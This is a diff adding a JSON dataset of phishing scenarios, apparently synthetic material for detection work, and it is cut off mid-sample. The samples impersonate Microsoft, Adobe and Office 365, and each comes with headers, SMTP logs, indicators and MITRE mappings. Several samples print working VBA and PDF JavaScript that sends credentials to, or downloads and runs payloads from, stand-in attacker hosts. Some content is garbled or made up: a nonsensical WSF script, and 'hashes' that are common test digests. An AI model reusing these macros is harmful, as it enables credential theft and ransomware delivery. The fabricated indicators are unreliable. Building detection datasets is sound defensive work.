@@ -1,0 +1,483 @@
+{
+  "samples": [
+    {
+      "scenario": "Phishing email with a malicious Excel spreadsheet containing a VBA macro that harvests credentials and sends them to a remote server.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@micros0ft-secure.com>\r\nReceived: from mail.micros0ft-secure.com (mail.micros0ft-secure.com [198.51.100.99])\r\n\tby mx.enterprise.com (Postfix) with ESMTPS id 4B3C21DFA7\r\n\tfor <employee@enterprise.com>; Fri, 12 May 2023 16:22:11 +0000 (UTC)\r\nReceived-SPF: pass (enterprise.com: domain of alerts@micros0ft-secure.com designates 198.51.100.99 as permitted sender) receiver=mx.enterprise.com; client-ip=198.51.100.99; envelope-from=alerts@micros0ft-secure.com; helo=mail.micros0ft-secure.com;\r\nAuthentication-Results: mx.enterprise.com; dkim=pass header.d=micros0ft-secure.com; spf=pass smtp.mailfrom=alerts@micros0ft-secure.com; dmarc=fail header.from=microsoft.com;\r\nFrom: \"Microsoft Security\" <alerts@micros0ft-secure.com>\r\nTo: employee@enterprise.com\r\nSubject: Immediate Action Required: Security Audit Report\r\nMessage-ID: <20230512162211.4B3C21DFA7@mail.micros0ft-secure.com>\r\nDate: Fri, 12 May 2023 16:22:11 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_54321_98765\"",
+        "email_body": "------=_Part_54321_98765\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<html><body>\r\n<p>Dear User,</p>\r\n<p>Please review the attached Security Audit Report for your account. Immediate attention is required to address identified vulnerabilities.</p>\r\n<p>Regards,<br>Microsoft Security Team</p>\r\n</body></html>\r\n------=_Part_54321_98765\r\nContent-Type: application/vnd.ms-excel.sheet.macroenabled.12; name=\"Audit_Report.xlsm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Audit_Report.xlsm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\r\n... (truncated base64 Excel macro document) ...",
+        "smtp_transaction_log": "220 mail.micros0ft-secure.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.micros0ft-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<alerts@micros0ft-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Security\" <alerts@micros0ft-secure.com>\r\nTo: employee@enterprise.com\r\nSubject: Immediate Action Required: Security Audit Report\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 4B3C21DFA7\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_macro_vba": "Private Sub Workbook_Open()\r\n    Dim http As Object\r\n    Dim url As String\r\n    Dim username As String\r\n    Dim password As String\r\n    username = ThisWorkbook.Sheets(1).Range(\"B2\").Value\r\n    password = ThisWorkbook.Sheets(1).Range(\"B3\").Value\r\n    url = \"https://data-collector.malicious-server.org/collect\"\r\n    Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n    http.Open \"POST\", url, False\r\n    http.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n    http.Send \"user=\" & username & \"&pass=\" & password\r\nEnd Sub",
+        "malicious_domain_registration": {
+          "domain": "malicious-server.org",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-03-29T08:45:12Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "1a79a4d60de6718e8e5b326e338ae533",
+          "sha1": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
+          "sha256": "b6d81b360a5672d80c27430f39153e2c0f3c5b7a8b8e1f33f9a3f4b0fb8a2a9f"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Victim\\Documents\\Audit_Report.xlsm",
+          "network_connection": "HTTPS POST to 203.0.113.45:443",
+          "process_spawned": "EXCEL.EXE",
+          "process_command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" Audit_Report.xlsm",
+          "dns_requests": [
+            "malicious-server.org"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain micros0ft-secure.com is a homoglyph of microsoft.com",
+        "Attachment is macro-enabled Excel spreadsheet (.xlsm)",
+        "VBA macro runs on workbook open and posts credentials",
+        "Outbound HTTPS POST to suspicious domain malicious-server.org",
+        "Suspicious domain registered recently in China",
+        "Execution of EXCEL.EXE with unusual macro activity"
+      ],
+      "detection_method": "Email security gateway detects suspicious domain and attachment; sandbox analysis reveals macro execution and data exfiltration attempts; endpoint monitors unusual HTTPS POST connections; network logs show DNS queries to malicious-server.org; user reports unexpected security audit email.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1537 - Transfer Data to Cloud Account"
+      ]
+    },
+    {
+      "scenario": "Phishing email with RTF attachment exploiting CVE-2017-11882 to execute shellcode that downloads a remote payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <notify@secure-microsof.com>\r\nReceived: from mail.secure-microsof.com (mail.secure-microsof.com [203.0.114.11])\r\n\tby mx.corporate.net (Postfix) with ESMTPS id 8F9B12ACDE\r\n\tfor <staff@corporate.net>; Tue, 16 May 2023 11:45:29 +0000 (UTC)\r\nReceived-SPF: fail (corporate.net: domain of notify@secure-microsof.com does not designate 203.0.114.11 as permitted sender) receiver=mx.corporate.net; client-ip=203.0.114.11; envelope-from=notify@secure-microsof.com; helo=mail.secure-microsof.com;\r\nFrom: \"Microsoft Notification\" <notify@secure-microsof.com>\r\nTo: staff@corporate.net\r\nSubject: Critical: Document Update Required\r\nMessage-ID: <20230516114529.8F9B12ACDE@mail.secure-microsof.com>\r\nDate: Tue, 16 May 2023 11:45:29 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_13579_24680\"",
+        "email_body": "------=_Part_13579_24680\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear User,\r\n\r\nPlease open the attached document to update your records. This is a critical update.\r\n\r\nRegards,\r\nMicrosoft Support\r\n------=_Part_13579_24680\r\nContent-Type: application/rtf; name=\"Update_Details.rtf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Update_Details.rtf\"\r\n\r\ne1xydGYxXGFuc2lcZGVmYXVsdCB7XGZpbmRkZWYgY2VydH0KXGJlc3QgbW9kdWxlXGJlc3Qg\r\nc3VjY2Vzc2Z1bGx5IGNvbXBpbGVkLg==\r\n... (truncated base64 RTF exploit) ...",
+        "smtp_transaction_log": "220 mail.secure-microsof.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.secure-microsof.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<notify@secure-microsof.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<staff@corporate.net>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Notification\" <notify@secure-microsof.com>\r\nTo: staff@corporate.net\r\nSubject: Critical: Document Update Required\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 8F9B12ACDE\r\nQUIT\r\n221 2.0.0 Bye",
+        "exploit_details": {
+          "cve": "CVE-2017-11882",
+          "description": "Memory corruption vulnerability in Equation Editor allows remote code execution.",
+          "shellcode_behavior": "Downloads payload from http://download-server.net/exploit_payload.exe and executes it silently."
+        },
+        "malicious_domain_registration": {
+          "domain": "download-server.net",
+          "registrar": "Google LLC",
+          "creation_date": "2023-05-01T15:00:00Z",
+          "registrant_country": "UA",
+          "name_servers": [
+            "ns1.google.com",
+            "ns2.google.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "9e107d9d372bb6826bd81d3542a419d6",
+          "sha1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+          "sha256": "d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb7625f0e0a5a2e9d99a"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Victim\\AppData\\Local\\Temp\\exploit_payload.exe",
+          "network_connection": "TCP Connect to 198.51.100.101:80",
+          "process_spawned": "exploit_payload.exe",
+          "process_command_line": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\exploit_payload.exe\" -silent",
+          "dns_requests": [
+            "download-server.net"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain secure-microsof.com is a homoglyph of microsoft.com",
+        "RTF attachment exploiting known CVE-2017-11882 vulnerability",
+        "Shellcode downloads and executes remote payload silently",
+        "Outbound HTTP connection to suspicious domain download-server.net",
+        "Suspicious domain registered recently in Ukraine",
+        "Temporary executable spawned from user temp directory"
+      ],
+      "detection_method": "Email gateway blocks known exploit patterns; sandbox detonates RTF and detects shellcode behavior; endpoint protection flags unknown executable creation; network monitoring alerts on HTTP GET to download-server.net; user education prevents opening suspicious attachments.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1203 - Exploitation for Client Execution",
+        "T1105 - Ingress Tool Transfer",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell"
+      ]
+    },
+    {
+      "scenario": "Phishing email with password-protected PDF attachment containing embedded JavaScript that downloads and executes a remote malware payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@secure-adobe.com>\r\nReceived: from mail.secure-adobe.com (mail.secure-adobe.com [192.0.2.123])\r\n\tby mx.enterprise.org (Postfix) with ESMTPS id 1D4E56FA23\r\n\tfor <user@enterprise.org>; Thu, 18 May 2023 07:12:48 +0000 (UTC)\r\nReceived-SPF: pass (enterprise.org: domain of support@secure-adobe.com designates 192.0.2.123 as permitted sender) receiver=mx.enterprise.org; client-ip=192.0.2.123; envelope-from=support@secure-adobe.com; helo=mail.secure-adobe.com;\r\nAuthentication-Results: mx.enterprise.org; dkim=pass header.d=secure-adobe.com; spf=pass smtp.mailfrom=support@secure-adobe.com; dmarc=fail header.from=adobe.com;\r\nFrom: \"Adobe Support\" <support@secure-adobe.com>\r\nTo: user@enterprise.org\r\nSubject: Important: Your Adobe Account Statement\r\nMessage-ID: <20230518071248.1D4E56FA23@mail.secure-adobe.com>\r\nDate: Thu, 18 May 2023 07:12:48 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_24680_13579\"",
+        "email_body": "------=_Part_24680_13579\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear Customer,\r\n\r\nPlease find attached your monthly Adobe account statement. The PDF is password-protected for your security. Use password 'Statement2023' to open the document.\r\n\r\nBest regards,\r\nAdobe Support Team\r\n------=_Part_24680_13579\r\nContent-Type: application/pdf; name=\"Account_Statement.pdf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Account_Statement.pdf\"\r\n\r\nJVBERi0xLjQKJcfsj6IKNSAwIG9iago8PC9UeXBlIC9QYWdlL1BhcmVudCAxIDAgUi9NZWRp\r\naWFCb3ggWzAgMCA2MTIgNzkyXS9Db250ZW50cyA2IDAgUi9SZXNvdXJjZXMgNyAwIFIgL1Jv\r\n... (truncated base64 PDF with embedded JS) ...",
+        "smtp_transaction_log": "220 mail.secure-adobe.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.secure-adobe.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<support@secure-adobe.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<user@enterprise.org>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Adobe Support\" <support@secure-adobe.com>\r\nTo: user@enterprise.org\r\nSubject: Important: Your Adobe Account Statement\r\n\r\n[Email body with password-protected PDF attachment]\r\n.\r\n250 2.0.0 Ok: queued as 1D4E56FA23\r\nQUIT\r\n221 2.0.0 Bye",
+        "embedded_javascript": "app.alert('Welcome to your statement');\nvar url = 'http://pdf-malicious.net/payload.exe';\nvar req = new Net.HTTP();\nreq.open('GET', url, false);\nreq.send();\nif (req.status == 200) {\n  var stream = util.streamFromString(req.responseBody);\n  stream.saveToFile('/C/Users/Public/update.exe');\n  app.launchURL('file:///C:/Users/Public/update.exe', true);\n}",
+        "malicious_domain_registration": {
+          "domain": "pdf-malicious.net",
+          "registrar": "NameSilo, LLC",
+          "creation_date": "2023-04-10T13:55:44Z",
+          "registrant_country": "BR",
+          "name_servers": [
+            "ns1.namesilo.com",
+            "ns2.namesilo.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "3c6e0b8a9c15224a8228b9a98ca1531d",
+          "sha1": "f96b697d7cb7938d525a2f31aaf161d0b8f6f5a0",
+          "sha256": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Public\\update.exe",
+          "network_connection": "TCP Connect to 198.51.100.77:80",
+          "process_spawned": "update.exe",
+          "process_command_line": "C:\\Users\\Public\\update.exe",
+          "dns_requests": [
+            "pdf-malicious.net"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain secure-adobe.com appears legitimate but DMARC fails",
+        "Password-protected PDF attachment with embedded JavaScript",
+        "JavaScript downloads and saves executable to public user directory",
+        "Launches executable via app.launchURL method",
+        "Suspicious domain pdf-malicious.net registered recently in Brazil",
+        "Outbound HTTP request to suspicious IP 198.51.100.77"
+      ],
+      "detection_method": "Email gateway flags DMARC failure and password-protected attachment; sandbox simulates PDF open and detects JavaScript download behavior; endpoint AV detects execution of unknown binary from public folder; network IDS alerts on HTTP connections to pdf-malicious.net; user awareness training highlights suspicious attachments.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.007 - Command and Scripting Interpreter: JavaScript",
+        "T1105 - Ingress Tool Transfer",
+        "T1218.005 - Signed Binary Proxy Execution: Adobe Reader"
+      ]
+    },
+    {
+      "scenario": "Phishing email containing a malicious PowerPoint file with embedded macro that downloads and runs ransomware payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@off1ce365-updates.com>\r\nReceived: from mail.off1ce365-updates.com (mail.off1ce365-updates.com [192.0.2.78])\r\n\tby mx.businesscorp.com (Postfix) with ESMTPS id 5A9C67FEDA\r\n\tfor <employee@businesscorp.com>; Mon, 22 May 2023 14:30:05 +0000 (UTC)\r\nReceived-SPF: pass (businesscorp.com: domain of alerts@off1ce365-updates.com designates 192.0.2.78 as permitted sender) receiver=mx.businesscorp.com; client-ip=192.0.2.78; envelope-from=alerts@off1ce365-updates.com; helo=mail.off1ce365-updates.com;\r\nAuthentication-Results: mx.businesscorp.com; dkim=pass header.d=off1ce365-updates.com; spf=pass smtp.mailfrom=alerts@off1ce365-updates.com; dmarc=fail header.from=office365.com;\r\nFrom: \"Office 365 Alerts\" <alerts@off1ce365-updates.com>\r\nTo: employee@businesscorp.com\r\nSubject: Office 365 Security Patch Available\r\nMessage-ID: <20230522143005.5A9C67FEDA@mail.off1ce365-updates.com>\r\nDate: Mon, 22 May 2023 14:30:05 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_11223_44556\"",
+        "email_body": "------=_Part_11223_44556\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<html><body>\r\n<p>Dear User,</p>\r\n<p>An important security patch for Office 365 has been released. Please open the attached presentation to update your software.</p>\r\n<p>Thank you,<br>Office 365 Support Team</p>\r\n</body></html>\r\n------=_Part_11223_44556\r\nContent-Type: application/vnd.ms-powerpoint.presentation.macroenabled.12; name=\"Security_Update.pptm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Security_Update.pptm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAA=\r\n... (truncated base64 PowerPoint macro document) ...",
+        "smtp_transaction_log": "220 mail.off1ce365-updates.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.off1ce365-updates.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<alerts@off1ce365-updates.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@businesscorp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Office 365 Alerts\" <alerts@off1ce365-updates.com>\r\nTo: employee@businesscorp.com\r\nSubject: Office 365 Security Patch Available\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 5A9C67FEDA\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_macro_vba": "Sub Auto_Open()\r\n    Dim strURL As String\r\n    Dim strFile As String\r\n    strURL = \"http://ransomware-downloads.net/ransom.exe\"\r\n    strFile = Environ(\"TEMP\") & \"\\ransom.exe\"\r\n    Dim http As Object\r\n    Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n    http.Open \"GET\", strURL, False\r\n    http.Send\r\n    If http.Status = 200 Then\r\n        Dim stream As Object\r\n        Set stream = CreateObject(\"ADODB.Stream\")\r\n        stream.Open\r\n        stream.Type = 1\r\n        stream.Write http.responseBody\r\n        stream.Position = 0\r\n        stream.SaveToFile strFile, 2\r\n        stream.Close\r\n        Shell strFile, vbHide\r\n    End If\r\nEnd Sub",
+        "malicious_domain_registration": {
+          "domain": "ransomware-downloads.net",
+          "registrar": "PDR Ltd. d/b/a PublicDomainRegistry.com",
+          "creation_date": "2023-02-18T09:10:05Z",
+          "registrant_country": "RU",
+          "name_servers": [
+            "ns1.publicdomainregistry.com",
+            "ns2.publicdomainregistry.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "7d793037a0760186574b0282f2f435e7",
+          "sha1": "2c1743a391305fbf367df8e4f069f9f9b828b6e7",
+          "sha256": "6b86b273ff34fce19d6b804eff5a3f5742e92c8e3f1b8e5b3a2b3a5ff6d5e5b8"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Victim\\AppData\\Local\\Temp\\ransom.exe",
+          "network_connection": "TCP Connect to 203.0.114.77:80",
+          "process_spawned": "ransom.exe",
+          "process_command_line": "C:\\Users\\Victim\\AppData\\Local\\Temp\\ransom.exe",
+          "dns_requests": [
+            "ransomware-downloads.net"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain off1ce365-updates.com is a homoglyph of office365.com",
+        "Attachment is macro-enabled PowerPoint presentation (.pptm)",
+        "Auto_Open macro downloads and executes ransomware payload",
+        "Outbound HTTP connection to suspicious domain ransomware-downloads.net",
+        "Suspicious domain registered recently in Russia",
+        "Execution of ransomware binary from user temp directory"
+      ],
+      "detection_method": "Email filtering identifies homoglyph domain and macro attachment; sandbox environment triggers macro and observes payload download; endpoint AV intercepts ransomware execution; IDS flags HTTP traffic to ransomware-downloads.net; user reports suspicious patch email.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1105 - Ingress Tool Transfer",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Phishing email with a malicious Windows Script File (WSF) attachment that executes PowerShell to download and install a remote backdoor.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@update-microsoft.com>\r\nReceived: from mail.update-microsoft.com (mail.update-microsoft.com [203.0.113.150])\r\n\tby mx.corpnet.com (Postfix) with ESMTPS id 3F4D7A8C1B\r\n\tfor <admin@corpnet.com>; Wed, 24 May 2023 10:50:22 +0000 (UTC)\r\nReceived-SPF: fail (corpnet.com: domain of security@update-microsoft.com does not designate 203.0.113.150 as permitted sender) receiver=mx.corpnet.com; client-ip=203.0.113.150; envelope-from=security@update-microsoft.com; helo=mail.update-microsoft.com;\r\nFrom: \"Microsoft Security Updates\" <security@update-microsoft.com>\r\nTo: admin@corpnet.com\r\nSubject: Microsoft Security Update\r\nMessage-ID: <20230524105022.3F4D7A8C1B@mail.update-microsoft.com>\r\nDate: Wed, 24 May 2023 10:50:22 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_99887_77665\"",
+        "email_body": "------=_Part_99887_77665\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear IT Administrator,\r\n\r\nPlease apply the attached critical Microsoft security update immediately to protect your systems.\r\n\r\nBest regards,\r\nMicrosoft Security Team\r\n------=_Part_99887_77665\r\nContent-Type: text/xml; name=\"Update.wsf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Update.wsf\"\r\n\r\nPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHdzaD4KICA8bG9jYWw6\r\nc2VxdWVuY2UgdHlwZT0id2luZG93cy1zY3JpcHQiPgoJPHNjcmlwdCB0eXBlPSJw\nb3dlcnNoZWxsIj4KICAgIHNldCB1cmwgPSAiaHR0cDovL21hbGljaW91cy1iYWNrZG9vci5u\r\nZXQvYmFja2Rvb3IucGwiCiAgICBzZXQgcGF0aCA9IEVudmlyb24oIlRFTVAiKSAkKyAiXFx1\r\ncGRhdGUucGwiCiAgICBzZXQgc2hlbGwgPSBDcmVhdGVPYmplY3QoIk1TSFhMb2FkZXIiKQog\r\nICAgc2hlbGwuUmVuZXcgJiB1cmwgLCAic3RhdCAtd2FpdCAtTm8iCiAgPC9zY3JpcHQ+Cjw\r\nvbG9jYWw6c2VxdWVuY2U+Cjwvd3NoPg==\r\n... (truncated base64 WSF script) ...",
+        "smtp_transaction_log": "220 mail.update-microsoft.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.update-microsoft.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security@update-microsoft.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@corpnet.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Security Updates\" <security@update-microsoft.com>\r\nTo: admin@corpnet.com\r\nSubject: Microsoft Security Update\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 3F4D7A8C1B\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_script": "Set url = \"http://malicious-backdoor.net/backdoor.pl\"\nSet path = Environ(\"TEMP\") & \"\\update.pl\"\nSet shell = CreateObject(\"MSHXLoder\")\nshell.Renew & url , \"stat -wait -No\"",
+        "decoded_script_behavior": "PowerShell script downloads backdoor.pl from malicious-backdoor.net and executes it silently.",
+        "malicious_domain_registration": {
+          "domain": "malicious-backdoor.net",
+          "registrar": "Tucows Domains Inc.",
+          "creation_date": "2023-04-22T20:20:20Z",
+          "registrant_country": "RU",
+          "name_servers": [
+            "ns1.tucows.com",
+            "ns2.tucows.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "8f14e45fceea167a5a36dedd4bea2543",
+          "sha1": "6f1ed002ab5595859014ebf0951522d9b6c4d9d0",
+          "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Admin\\AppData\\Local\\Temp\\update.pl",
+          "network_connection": "TCP Connect to 198.51.100.88:80",
+          "process_spawned": "powershell.exe",
+          "process_command_line": "powershell.exe -ExecutionPolicy Bypass -File update.pl",
+          "dns_requests": [
+            "malicious-backdoor.net"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain update-microsoft.com is a homoglyph of microsoft.com",
+        "WSF attachment containing obfuscated PowerShell download script",
+        "PowerShell downloads and executes backdoor payload silently",
+        "Outbound HTTP connection to suspicious domain malicious-backdoor.net",
+        "Suspicious domain registered recently in Russia",
+        "Execution of PowerShell with bypassed execution policy"
+      ],
+      "detection_method": "Email gateway flags SPF fail and suspicious attachment type; sandbox detonates WSF and triggers PowerShell download; endpoint monitors PowerShell execution with unusual parameters; network IDS alerts on HTTP request to malicious-backdoor.net; user training discourages opening unknown script files.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1053.005 - Scheduled Task/Job: Scheduled Task"
+      ]
+    },
+    {
+      "scenario": "Spearphishing email containing a malicious Excel file with embedded macros that download and execute a PowerShell payload to establish persistence.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@micros0ft-update.com>\r\nReceived: from mail.micros0ft-update.com (mail.micros0ft-update.com [198.51.100.50])\r\n\tby inbound.partnercorp.com (Postfix) with ESMTPS id 3B5F1234CD\r\n\tfor <john.doe@partnercorp.com>; Thu, 15 Jun 2023 11:22:45 +0000 (UTC)\r\nReceived-SPF: fail (partnercorp.com: domain of security@micros0ft-update.com does not designate 198.51.100.50 as permitted sender) receiver=inbound.partnercorp.com; client-ip=198.51.100.50; envelope-from=security@micros0ft-update.com; helo=mail.micros0ft-update.com;\r\nFrom: \"Microsoft Update Team\" <security@micros0ft-update.com>\r\nTo: john.doe@partnercorp.com\r\nSubject: Critical: Excel Security Update Available\r\nMessage-ID: <20230615112245.3B5F1234CD@mail.micros0ft-update.com>\r\nDate: Thu, 15 Jun 2023 11:22:45 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_54321_98765\"",
+        "email_body": "------=_Part_54321_98765\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\n<html><body>\r\n<p>Dear User,</p>\r\n<p>Microsoft has released a critical update for Excel to fix recent security issues. Please open the attached Excel file and enable macros to apply the patch.</p>\r\n<p>Regards,<br>Microsoft Update Team</p>\r\n</body></html>\r\n------=_Part_54321_98765\r\nContent-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name=\"UpdateSecurity.xlsm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"UpdateSecurity.xlsm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\r\n... (truncated base64 Excel macro document) ...",
+        "smtp_transaction_log": "220 mail.micros0ft-update.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.micros0ft-update.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security@micros0ft-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<john.doe@partnercorp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Update Team\" <security@micros0ft-update.com>\r\nTo: john.doe@partnercorp.com\r\nSubject: Critical: Excel Security Update Available\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 3B5F1234CD\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_macro_vba": "Private Sub Workbook_Open()\r\n    Dim strURL As String\r\n    Dim strFile As String\r\n    strURL = \"http://updateserver.net/pspayload.ps1\"\r\n    strFile = Environ(\"TEMP\") & \"\\payload.ps1\"\r\n    Dim http As Object\r\n    Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n    http.Open \"GET\", strURL, False\r\n    http.Send\r\n    If http.Status = 200 Then\r\n        Dim stream As Object\r\n        Set stream = CreateObject(\"ADODB.Stream\")\r\n        stream.Open\r\n        stream.Type = 1\r\n        stream.Write http.responseBody\r\n        stream.SaveToFile strFile, 2\r\n        stream.Close\r\n        Shell \"powershell.exe -ExecutionPolicy Bypass -File \" & strFile, vbHide\r\n    End If\r\nEnd Sub",
+        "malicious_domain_registration": {
+          "domain": "updateserver.net",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-30T08:15:20Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "attachment_file_hashes": {
